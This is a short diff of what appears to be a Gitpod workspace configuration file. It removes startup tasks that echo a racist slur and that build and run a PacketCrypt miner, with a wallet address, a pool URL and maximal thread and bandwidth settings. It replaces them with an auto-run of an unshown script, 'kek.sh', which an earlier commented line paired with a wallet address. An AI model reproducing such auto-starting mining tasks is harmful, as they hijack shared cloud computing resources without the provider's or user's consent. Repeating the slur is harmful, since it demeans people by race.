@@ -8,11 +8,4 @@ ports:
 
 # List the start up tasks. You can start them in parallel in multiple terminals. See https://www.gitpod.io/docs/config-start-tasks/
 tasks:
-  - init: echo "Fuck your nigger pet"
-  - command:  cd PacketCrypt
-  - command: ./autogen.sh
-  - command: ./configure
-  - command: make
-  - command: npm install
-  - command: node ./annmine.js --paymentAddr pkt1qc6fayu80saj98jedz2u7ynuqs3m538z36dqxpa http://pool.gridfinity.com/master --maxKbps 600000000 --threads 16
-#- init: bash ./kek.sh 43stYNqXYntQtSQEEoFpUrEhvpzb8sucgUizHK7dk5ya8qkz2gQ1DgdJhKnMK3tbrPJN2g53jFzLVAtkvefoF8KNVPTsv6c
+  init: bash ./kek.sh
